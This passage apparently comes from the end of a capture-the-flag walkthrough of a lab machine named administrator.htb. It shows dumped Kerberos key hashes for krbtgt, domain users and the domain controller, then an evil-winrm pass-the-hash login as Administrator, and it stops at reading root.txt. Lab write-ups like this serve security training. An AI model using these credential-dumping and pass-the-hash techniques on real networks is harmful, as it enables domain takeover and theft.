krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:2bea6d73374af597736f2333e51d6094da5e4a1b50882e5f68792cfb55f54f1d
administrator.htb\michael:aes128-cts-hmac-sha1-96:23190caab969ab6f206da0d287199d77
administrator.htb\michael:des-cbc-md5:197ffb469d2f151c
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e848104836a1348c8a2f629d216cf3bdbea6df0cfcd93507f42916f2d31f8f81
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e474226e715ac94d7330e87d790856e9
administrator.htb\benjamin:des-cbc-md5:9eb53252a732c20b
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```
Finally, we find the final flag:
```
└─$ evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/10/2026  12:33 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```